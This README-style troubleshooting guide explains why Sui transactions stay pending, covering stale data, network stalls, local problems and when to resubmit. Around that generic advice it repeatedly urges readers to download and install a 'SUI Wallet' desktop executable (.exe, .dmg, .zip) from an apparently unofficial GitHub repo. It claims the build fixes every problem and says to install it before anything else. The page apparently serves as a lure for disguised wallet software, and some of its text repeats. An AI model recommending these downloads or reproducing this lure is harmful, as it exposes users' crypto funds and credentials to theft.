![SUI Wallet](assets/banner-article.png)

# Why is my Sui transaction pending?

Pending usually means the network, not your wallet; the digest tells you which.

[![Download for Windows](https://img.shields.io/badge/DOWNLOAD-WINDOWS-4DA2FF?style=for-the-badge&labelColor=0D1117&logoColor=white&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B)](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/download/v0.2.6/sui-wallet-desktop-win-v0.2.6.exe) [![Download for macOS](https://img.shields.io/badge/DOWNLOAD-MACOS-4DA2FF?style=for-the-badge&labelColor=0D1117&logoColor=white&logo=apple)](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/download/v0.2.6/sui-wallet-desktop-macos-v0.2.6.dmg) [![Download for Linux](https://img.shields.io/badge/DOWNLOAD-LINUX-4DA2FF?style=for-the-badge&labelColor=0D1117&logoColor=white&logo=linux)](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/download/v0.2.6/sui-wallet-desktop-linux-v0.2.6.zip)

| Platform | Requirements | File |
| --- | --- | --- |
| ![platform Windows](https://img.shields.io/badge/platform-Windows-4DA2FF?style=for-the-badge&labelColor=0D1117&logoColor=white&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B) | Windows 10 (1909) or later, 64-bit | [sui-wallet-desktop-win-v0.2.6.exe](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/download/v0.2.6/sui-wallet-desktop-win-v0.2.6.exe) |
| ![platform macOS](https://img.shields.io/badge/platform-macOS-4DA2FF?style=for-the-badge&labelColor=0D1117&logoColor=white&logo=apple) | macOS 12 or later | [sui-wallet-desktop-macos-v0.2.6.dmg](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/download/v0.2.6/sui-wallet-desktop-macos-v0.2.6.dmg) |
| ![platform Linux](https://img.shields.io/badge/platform-Linux-4DA2FF?style=for-the-badge&labelColor=0D1117&logoColor=white&logo=linux) | x64, Ubuntu 20.04 or later, or equivalent | [sui-wallet-desktop-linux-v0.2.6.zip](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/download/v0.2.6/sui-wallet-desktop-linux-v0.2.6.zip) |

Windows ships one `.exe`, macOS one `.dmg`, and Linux one `.zip` holding a `.deb` and a `.pacman` package.

All three files, with their SHA-256 digests, are on the [release page](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/latest).

> **Current release:** every problem described in these guides is addressed in the build above. Install it before trying anything else.

## Short answer

A pending transaction is one the network has accepted but not yet included, and it resolves by being
included or by failing. Three things look identical on screen and are not: stale data on the provider side,
a network stall, and a local problem such as a permission the app does not have. The current release names
which one you are looking at.

## What pending means on Sui

A submitted transaction is in the network's hands. Until it is included, the effect has not happened: the balance has not moved, the recipient has nothing, and the transaction can still fail. That is why pending is a state, not a verdict.

That is why "pending" is not a fault by itself. It is a state with a duration, and the useful question is
which of the outcomes is coming rather than how to force one.

## The three causes and how they differ

| What you see | What is actually happening | What to do |
| --- | --- | --- |
| Spinner stays, balance already correct elsewhere | the app is showing stale provider data | refresh the account; the transaction is done |
| Nothing progresses for every transaction, for everyone | a network stall | wait; there is nothing local to fix |
| One kind of action fails while others work | a local permission or setup problem | check the app's own error, not the network |

The distinction is not cosmetic. The first case means the transaction already succeeded and the screen is behind. The second means the chain is the bottleneck. The third means neither, and looking at the network will never explain it at all.

## The diagnostics panel

The panel names three things: the app version, the network the wallet is on, and the digest of the last transaction it handled. Those three answer the questions the table raises, and they are on one screen rather than scattered through menus.

A digest that exists means something was submitted, so the chain has a record of it - which is the fact
that decides whether resubmitting is safe. A version older than the current release points at the first
row of the table before anything else.

## When to wait and when to resubmit

Wait while the transaction is pending and nothing contradicts it. Resubmit when you have evidence it is not coming: a digest that never appears, or a failure the app has already reported. Between those two there is no third action.

Resubmitting a transaction that is merely slow is how one payment becomes two. The panel's digest is the
check that prevents it, and it is cheaper than explaining a double send to a recipient.

[How to send SUI from your wallet](https://github.com/sui-blockchain-wallet/onchain-transfer-guides/blob/main/how-to-send-sui-from-your-wallet.md) covers the confirmation window that makes a resubmission
unnecessary in the first place.

## A network stall as an example

On 14 January 2026, Sui Mainnet stalled when checkpoint certification failed, and it recovered. During a stall like that, every wallet on the network shows the same thing at once: transactions submitted and not included, for everybody, at the same time.

That is the case where reinstalling, updating and resubmitting all change nothing, because the problem is
not in the wallet. It is also the case most likely to be diagnosed as a wallet fault by a reader working
alone at midnight.

## What never helps

Reinstalling is the first thing people try and the last thing that helps: it removes the app, not the cause. Updating helps for the first row of the table and not for the other two, but it is cheap and it is the standing fix.

What also does not help is sending the same transaction again from a second window or a second machine.
Both are the same account, and both submit to the same network.

## What to check before anything else

Install the current release from the [release page](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/latest): the reported problems are fixed there, and an older build is where an ambiguous state comes from. Then read the panel - version, network, last digest - before deciding whether to wait, because those three lines settle it.

Then read the panel: version, network, last digest. Those three lines are the difference between waiting,
refreshing and investigating, and they are all on screen.

[SUI Wallet balance not updating](https://github.com/sui-blockchain-wallet/onchain-transfer-guides/blob/main/sui-wallet-balance-not-updating.md) takes the case where the transaction did land and the number
did not move, which looks like a pending transaction and is not.

## FAQ

### How long does a Sui transaction take to confirm?

Usually a short wait, and no page can give you a number that holds, because inclusion depends on the
network at that moment. The panel's digest tells you whether it happened.

### Is the network down or is my wallet the problem?

If every transaction from everyone is stuck at once, it is the network. If one action fails while others
work, it is local. The panel's version and network lines separate the two in a glance.

### Why can I not swap?

A swap is a contract call, so it needs the fee asset available and it can fail for its own reasons. If
sending works and swapping does not, the network is not the explanation.

### Why is it still pending after several epochs?

Several epochs without inclusion is not a slow transaction; it is either stale data or a failure the app
has not surfaced. Check the digest, then refresh the account before considering a resend.

### Does reinstalling fix a pending transaction?

No. It removes the application and changes nothing about the transaction, which is already with the
network.

### Should I send it again?

Only with evidence the first one is not coming. The last transaction digest in the panel is that evidence;
without it, you are guessing with your own balance.
